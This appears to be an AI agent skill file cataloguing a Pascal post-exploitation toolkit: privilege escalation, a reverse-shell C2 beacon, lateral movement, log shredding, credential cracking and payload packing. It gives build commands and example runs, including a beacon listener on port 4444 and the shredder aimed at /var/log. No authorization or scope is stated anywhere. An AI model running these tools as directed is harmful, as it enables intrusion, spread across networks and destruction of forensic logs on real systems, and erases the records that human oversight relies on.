---
name: ares-pascal-redteam-arsenal
description: "ARES Pascal Red Team Arsenal — Escalate, Beacon, Spread, Shredder, Keyforge, PayloadForge. Full suite of post-exploitation Pascal tools."
version: 1.0.0
author: Craig / ARES-WITNESS-PRIME
platforms: [linux]
tags: [ares, pascal, redteam, post-exploitation, c2, privilege-escalation]
related_skills: [ares-pascal-fleet, pascal-toolchain, pentest-redteam-pascal]
---

# 🔴 ARES Pascal Red Team Arsenal

## Overview

Six post-exploitation tools written in Pascal. Located under `/home/craig/projects/aethelgard/fleet/pascal/redteam/`. Each is a standalone compiled binary.

## Arsenal

| Tool | Path | Purpose |
|------|------|---------|
| **Escalate** | `redteam/escalate/escalate` | Privilege escalation (kernel exploits, SUID, capabilities) |
| **Beacon** | `redteam/beacon/beacon` | C2 beacon (reverse shell, callback, command loop) |
| **Spread** | `redteam/spread/spread` | Lateral movement (SSH, SMB, WMI passthrough) |
| **Shredder** | `redteam/shredder/shredder` | Log destruction, forensic countermeasures |
| **Keyforge** | `redteam/keyforge/keyforge` | Credential generation, password cracking |
| **PayloadForge** | `redteam/payloadforge/payloadforge` | Custom payload generation, packing |

## Shared Library

Common code in `redteam/common/`:
- `daemon_base.pas` — Background service framework
- `json_protocol.pas` — JSON IPC protocol
- `pascal_arsenal.pas` — Shared arsenal utilities

## Build All

```bash
cd /home/craig/projects/aethelgard/fleet/pascal
fpc redteam/escalate/escalate.pas
fpc redteam/beacon/beacon.pas
fpc redteam/spread/spread.pas
fpc redteam/shredder/shredder.pas
fpc redteam/keyforge/keyforge.pas
fpc redteam/payloadforge/payloadforge.pas
```

## Execution

```bash
# Run a beacon (example)
/home/craig/projects/aethelgard/fleet/pascal/redteam/beacon/beacon --lhost 0.0.0.0 --lport 4444

# Run escalate
/home/craig/projects/aethelgard/fleet/pascal/redteam/escalate/escalate --list-suid

# Run shredder (careful!)
/home/craig/projects/aethelgard/fleet/pascal/redteam/shredder/shredder --dry-run /var/log
```
